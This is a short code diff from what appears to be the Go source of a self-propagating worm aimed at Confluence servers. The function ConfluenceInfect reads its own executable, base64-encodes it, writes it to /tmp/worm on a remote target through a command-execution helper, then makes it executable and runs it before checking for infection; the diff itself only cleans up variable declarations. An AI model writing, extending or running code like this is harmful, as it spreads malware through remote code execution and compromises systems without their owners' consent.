@@ -75,9 +75,6 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 	func ConfluenceInfect(url string, endpoint string) bool {
     wormPath := "/tmp/worm"
 		var worm []byte
-		var copyTemplate string
-
-		copyTemplate = "echo %s | base64 -d | tee %s"
 
 		worm = GetFile("/proc/self/exe")
 		worm64 := base64.StdEncoding.EncodeToString(worm)
@@ -87,7 +84,7 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 		worm64 = base64.StdEncoding.EncodeToString(worm)
     CopyWorm(url, endpoint, worm64, "/tmp/exploit_nss_manual")    
 
-		command = fmt.Sprintf("chmod u+x %s; %s", wormPath, wormPath)
+		command := fmt.Sprintf("chmod u+x %s; %s", wormPath, wormPath)
 		ConfluenceCmdExecute(url, endpoint, command)
 
 		return ConfluenceCheckInfection(url, endpoint)
